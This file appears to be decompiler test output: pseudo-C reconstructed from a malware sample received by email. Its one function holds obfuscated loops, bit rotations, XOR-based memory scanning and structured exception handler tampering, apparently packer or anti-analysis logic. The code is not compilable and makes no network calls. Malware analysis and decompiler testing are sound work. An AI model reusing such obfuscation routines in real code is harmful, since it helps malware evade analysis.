// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1219/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004010D1(word32 eax, word32 edx, word32 ebp, word32 edi, selector fs, word32 dwArg00, LPCSTR, HWND, DLGPROC, LPARAM)
{
	if ((word32) Mem0[dwArg00 - 0xFFFFFFF8:byte] != 0x00000090)
	{
		DialogBoxParamA(dwArg00, tArg04, tArg08, tArg0C, tArg10);
		return;
	}
	else
	{
		word16 ax_61 = (word16) fp;
		word32 edi_74 = Mem0[0x004010CB:word32];
		word32 edx_68 = Mem0[DPB(0x0012F2D0, ax_61, 0, 16):word32];
		__rol(ax_61, 0x07);
		word32 esi_70 = 0x004010CB;
		word16 di_75 = (word16) edi_74;
		do
		{
			edx_68 = edx_68 + 0x00000001;
			word32 eax_93 = ~Mem0[edx_68 + 0x00000000:word32] + edi_74;
			esi_70 = ~esi_70 - 0x00000001 + edx_68;
		} while (eax_93 != 0x00000001);
		word32 eax_110 = DPB(eax_93 + 0x00000001, Mem0[edx_68 - 0x00000002:word16], 0, 16);
		__ror(esi_70, 0x18);
		__ror(~DPB(edi_74, di_75 - 0xFF9C, 0, 16), 0x1B);
		word32 edx_126 = dwArg00;
		word32 ecx_131 = Mem0[0x00401027:word32];
		do
		{
			word32 esi_139 = Mem0[edx_126 + 0x00000000:word32];
			__ror(esi_139, 0x03);
			edx_126 = edx_126 + 0x00000001;
		} while ((esi_139 ^ ecx_131) != 0x00000000);
		__rol((eax_110 << 0x00000010 >>u 0x00000010) + 0x003FBC0E, 0x03);
		Mem186[fs:0x00000000:word32] = fp - 0x0000000C;
		__ror(0x00000000, 0x08);
		return;
	}
}

